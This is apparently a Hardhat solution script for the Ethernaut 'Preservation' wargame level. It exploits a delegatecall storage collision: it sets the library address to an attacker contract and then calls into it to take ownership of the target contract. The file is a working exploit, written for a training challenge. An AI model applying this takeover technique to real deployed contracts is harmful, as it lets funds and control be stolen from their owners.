const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, slot
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x2faAe707758C827C1F3A2e2829F5939D40CD3d4B"
    let target = await ethers.getContractAt("Preservation", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "PreservationAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy()

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    tx = await target.setFirstTime(attackerContract.address)
    await tx.wait(1)
    slot = await target.timeZone1Library()
    console.log(`First address set to ${slot}`)
    tx = await target.setFirstTime("123", { gasLimit: 50000 })
    res = await tx.wait(1)

    // Check
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Pwned contract!`)
    } else {
        console.log(`${symbols.error} Owner is still set to ${owner}...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
